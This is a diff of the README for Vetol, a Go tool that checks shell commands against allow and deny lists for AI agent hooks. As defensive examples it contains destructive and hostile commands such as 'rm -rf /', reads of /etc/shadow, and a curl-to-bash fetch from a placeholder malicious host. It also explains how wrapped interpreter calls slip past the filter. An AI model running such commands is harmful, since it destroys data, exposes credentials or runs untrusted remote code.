@@ -1,4 +1,4 @@
-# Vetol
+# Vetol - Vet agent tools
 
 A CLI tool for validating shell commands using Bash AST analysis, suitable for AI agent hooks and other security-sensitive execution environments.
 
@@ -23,158 +23,270 @@ go install github.com/tf63/vetol/cmd/vetol
 **Vetol** only validates the provided command string and never executes it.
 
 ```bash
-$ vetol check -m denylist -r rm "ls"
-VALID
+$ vetol --config allowlist.json "ls -la /tmp"
+ALLOW
 $ echo $?
 0
 
-$ vetol check -m denylist -r rm "rm -rf /"
-INVALID
+$ vetol --config denylist.json "rm -rf /"
+DENY
 $ echo $?
 1
 ```
 
-### Allowlist Mode
+### Configuration File
 
-Only allow explicitly permitted commands:
-
-```bash
-# Single command
-vetol check --mode allowlist --rules ls,cat,grep "ls -la /tmp"
-
-# Multi-command sequence
-vetol check -m allowlist -r "docker compose exec app go fmt,ls,cat" "docker compose exec app go fmt ./..."
-```
-
-### Denylist Mode
-
-Allow all commands except explicitly forbidden ones:
+Rules are specified via a JSON configuration file:
 
 ```bash
-# Single command
-vetol check --mode denylist --rules rm,dd,mkfs "cat /etc/passwd"
-
-# Multi-command sequence
-vetol check -m denylist -r "docker compose exec app rm,rm -rf" "docker compose exec app rm -rf /"
-```
-
-### Using Configuration File
-
-Rules can be loaded from a JSON configuration file:
-
-```bash
-vetol check --config rules.json "docker compose exec app rm -rf /"
+vetol --config vetol.json "docker compose exec app rm -rf /"
 ```
 
 **Configuration file format:**
 
 ```json
 {
-  "mode": "denylist",
+  "mode": "allowlist",
   "rules": [
-    "docker compose exec app rm",
-    "docker compose exec app mkfs",
-    "docker run rm -rf",
-    "rm -rf",
-    "dd"
+    {
+      "command": "ls",
+      "include": ["-la"],
+      "exclude": []
+    },
+    {
+      "command": "grep",
+      "include": ["-r"],
+      "exclude": []
+    },
+    {
+      "command": "docker compose"
+    }
   ]
 }
 ```
 
-## Command Line Options
+#### Rule Fields
 
-- `--mode <mode>`, `-m <mode>`: Security validation mode (required unless using `--config`)
-  - `allowlist`: Only allow explicitly permitted commands
-  - `denylist`: Allow all commands except explicitly forbidden ones
-- `--rules <RULES>`, `-r <RULES>`: Comma-separated list of rules (required unless using `--config`)
-  - Each rule can be a single command or a space-separated sequence of commands
-- `--config <PATH>`: Path to a JSON configuration file (alternative to `--mode` and `--rules`)
+- **command** (required): Command name or prefix (space-separated for multi-word commands)
+- **include** (optional): Patterns that MUST be present
+  - All patterns must match for the rule to match
+- **exclude** (optional): Patterns that MUST NOT be present
+  - If any pattern matches, the rule does not match
+
+#### Pattern Types
+
+- **Short flags** (`-r`, `-la`): All characters must be present
+- **Long flags** (`--color`, `--color=auto`): Exact or prefix match with `=`
+- **Non-flag patterns**: Exact match required
+
+### Command Line Options
+
+- `--config <PATH>`: Path to JSON configuration file (REQUIRED)
 - `<COMMAND_STRING>`: The bash command string to validate (positional argument)
 
 ## Features
 
-✓ **AST-based parsing**: Improved detection of nested and obfuscated commands
+✓ **AST-based parsing**: Detects commands hidden in nested shell constructs
 ✓ **Allowlist/Denylist modes**: Flexible security policy configuration
-✓ **Prefix matching**: Rules match command sequences that start with the rule pattern (e.g., rule `echo` matches `echo`, `echo arg1`, `echo arg1 arg2`, etc.)
-✓ **Complex syntax support**: Handles pipes, substitutions, chains, redirects, and subshells
-✓ **JSON configuration**: Load rules from configuration files
-✓ **Command sequences**: Support for multi-command rules (e.g., `docker compose exec app rm`)
+✓ **Command prefix matching**: Single and multi-word command matching (e.g., `docker compose`)
+✓ **Include/Exclude constraints**: Fine-grained control with flag and pattern matching
+
+- Short flag matching: Character containment (e.g., `-la` matches `-l -a`)
+- Long flag matching: Prefix matching with values (e.g., `--color` matches `--color=auto`)
+- Non-flag pattern matching: Exact match
+  ✓ **Complex syntax support**: Handles pipes, substitutions, chains, redirects, and subshells
+  ✓ **JSON configuration**: Load rules from configuration files
 
 ## Limitations
 
 Vetol validates command structure through Bash AST analysis.
 
-It does not:
+### What Vetol Cannot Detect
 
-- Analyze command arguments semantically
-- Detect malicious behavior inside allowed binaries
-- Execute commands
-- Provide sandboxing or isolation
+- **Commands in string arguments**: Commands hidden as string arguments are not detected
+
+  - Example: `bash -c "rm -rf /"` - The `rm -rf /` inside the string argument is not detected
+  - Example: `sh -c "cat /etc/shadow"` - The `cat` command inside quotes is not analyzed
+  - Other affected: `eval "dangerous command"`, `python -c "..."`, `node -e "..."`
+
+- **Semantic analysis of arguments**: Only structure is validated, not argument content
+
+  - Example: `curl https://malicious.site/script.sh | bash` - The script content is not analyzed
+
+- **Behavior inside allowed binaries**: Malicious behavior within allowed commands cannot be detected
+
+  - Example: An allowed binary could be trojanized or contain backdoors
+
+- **Execution and sandboxing**: Vetol only validates structure, it does not:
+  - Execute commands
+  - Provide isolation or sandboxing
+  - Prevent system-level attacks
+
+### Mitigation Strategies
+
+To address the string argument limitation, use denylist mode to block dangerous interpreter calls:
+
+```json
+{
+  "mode": "denylist",
+  "rules": [
+    { "command": "bash", "include": ["-c"] },
+    { "command": "sh", "include": ["-c"] },
+    { "command": "eval" },
+    { "command": "source" },
+    { "command": "python", "include": ["-c"] },
+    { "command": "node", "include": ["-e"] },
+    { "command": "ruby", "include": ["-e"] },
+    { "command": "perl", "include": ["-e"] }
+  ]
+}
+```
+
+This approach prevents the most common methods of injecting commands as string arguments.
 
 ## Examples
 
-### Example 1: Simple Commands
+### Example 1: Allowlist Mode - Simple Commands
 
-```bash
-# Allowlist mode: allow only specific commands
-vetol check -m allowlist -r "cat,ls" "cat /etc/passwd"
-# Output: VALID
+Create `allowlist.json`:
 
-vetol check -m allowlist -r "cat,ls" "cat /etc/passwd && rm file.txt"
-# Output: INVALID
-
-# Denylist mode: forbid specific commands
-vetol check -m denylist -r "rm" "cat /etc/passwd"
-# Output: VALID
-
-vetol check -m denylist -r "rm" "rm -rf /"
-# Output: INVALID
+```json
+{
+  "mode": "allowlist",
+  "rules": [{ "command": "ls" }, { "command": "cat" }, { "command": "echo" }]
+}
 ```
 
-### Example 2: Commands with Options
-
 ```bash
-# Allowlist specific command with options
-vetol check -m allowlist -r "docker" "docker ps"
-# Output: VALID
+vetol --config allowlist.json "cat /etc/passwd"
+# Output: ALLOW
 
-# Forbid specific command options
-vetol check -m denylist -r "docker run" "docker build -t image ."
-# Output: VALID
-
-vetol check -m denylist -r "docker run" "docker run -it ubuntu"
-# Output: INVALID
+vetol --config allowlist.json "cat /etc/passwd && rm file.txt"
+# Output: DENY (rm is not allowed)
 ```
 
-### Example 3: Multiple Commands
+### Example 2: Allowlist with Include Constraints
 
-```bash
-# Allow multi-command sequences
-vetol check -m allowlist -r "pwd,ls,cat" "pwd && ls -la && cat file.txt"
-# Output: VALID
+Create `allowlist-with-flags.json`:
 
-# Forbid multi-command sequences
-vetol check -m denylist -r "rm,dd" "ls && pwd && echo done"
-# Output: VALID
-
-vetol check -m denylist -r "rm,dd" "pwd && rm -rf /"
-# Output: INVALID
+```json
+{
+  "mode": "allowlist",
+  "rules": [
+    {
+      "command": "ls",
+      "include": ["-la"]
+    },
+    {
+      "command": "grep",
+      "include": ["-r"]
+    }
+  ]
+}
 ```
 
-### Example 4: Obfuscated Commands
+```bash
+vetol --config allowlist-with-flags.json "ls -la /tmp"
+# Output: ALLOW
+
+vetol --config allowlist-with-flags.json "ls -l /tmp"
+# Output: DENY (missing -a flag)
+
+vetol --config allowlist-with-flags.json "grep -r pattern /tmp"
+# Output: ALLOW
+```
+
+### Example 3: Denylist Mode - Forbidden Commands
+
+Create `denylist.json`:
+
+```json
+{
+  "mode": "denylist",
+  "rules": [{ "command": "rm" }, { "command": "dd" }, { "command": "docker compose exec app rm" }]
+}
+```
 
 ```bash
-# Command substitution: simple string matching would miss this
-vetol check -m allowlist -r "echo,cat" 'echo $(rm -rf /)'
-# Output: INVALID
+vetol --config denylist.json "cat README.md"
+# Output: ALLOW
 
-# Command chaining: prefix matching would miss this
-vetol check -m denylist -r "rm" "ls && rm -rf /"
-# Output: INVALID
+vetol --config denylist.json "rm -rf /"
+# Output: DENY (rm is forbidden)
 
-# Pipelines: checks all piped commands
-vetol check -m allowlist -r "pwd,grep" "pwd | grep test | rm"
-# Output: INVALID
+vetol --config denylist.json "docker compose exec app rm -rf /"
+# Output: DENY (docker compose exec app rm is forbidden)
+```
+
+### Example 4: Include/Exclude Constraints
+
+Create `safe-rm.json`:
+
+```json
+{
+  "mode": "denylist",
+  "rules": [
+    {
+      "command": "rm",
+      "exclude": ["-i"]
+    }
+  ]
+}
+```
+
+```bash
+vetol --config safe-rm.json "rm file.txt"
+# Output: DENY (rm without -i is forbidden)
+
+vetol --config safe-rm.json "rm -i file.txt"
+# Output: ALLOW (rm with -i is allowed)
+```
+
+### Example 5: Multi-Word Commands
+
+Create `docker-config.json`:
+
+```json
+{
+  "mode": "denylist",
+  "rules": [
+    {
+      "command": "docker compose exec app rm"
+    },
+    {
+      "command": "docker run"
+    }
+  ]
+}
+```
+
+```bash
+vetol --config docker-config.json "docker ps"
+# Output: ALLOW
+
+vetol --config docker-config.json "docker compose exec app rm -rf /"
+# Output: DENY (docker compose exec app rm is forbidden)
+
+vetol --config docker-config.json "docker run -it ubuntu"
+# Output: DENY (docker run is forbidden)
+```
+
+### Example 6: Obfuscated Commands
+
+Vetol detects commands hidden in nested shell constructs:
+
+```bash
+# Command substitution
+vetol --config allowlist.json 'echo $(rm -rf /)'
+# Output: DENY (rm is detected even in substitution)
+
+# Command chaining
+vetol --config denylist.json "ls && rm -rf /"
+# Output: DENY (rm is detected in chain)
+
+# Pipelines
+vetol --config allowlist.json "pwd | grep test | rm"
+# Output: DENY (rm is detected in pipeline)
 ```
 
 ## Dependencies
@@ -182,54 +294,10 @@ vetol check -m allowlist -r "pwd,grep" "pwd | grep test | rm"
 - [**mvdan.cc/sh/v3/syntax**](https://github.com/mvdan/sh): Bash command parser and AST builder
 - Go 1.26 standard library
 
-## Development
+## Development & Contributing
 
-### Prerequisites
-
-- Go 1.26 or later
-
-### Running Tests
-
-```bash
-bash tests/test.sh
-```
-
-Or run Go tests:
-
-```bash
-go test ./...
-```
-
-### Build
-
-```bash
-go build -o vetol ./cmd/vetol
-```
-
-## Architecture
-
-```
-vetol/
-├── cmd/
-│   └── vetol/
-│       └── main.go          # CLI entry point
-├── internal/
-│   ├── logger/              # Structured logging utilities
-│   ├── parser/              # Bash AST parsing logic
-│   └── validator/           # Security validation logic
-├── pkg/
-│   └── rules/               # Rule management and configuration
-├── testdata/                # Test configuration files
-├── tests/
-│   └── test.sh              # Integration tests
-├── go.mod
-└── go.sum
-```
+For development setup, testing, architecture details, and contribution guidelines, see [CONTRIBUTING.md](CONTRIBUTING.md).
 
 ## License
 
 MIT
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
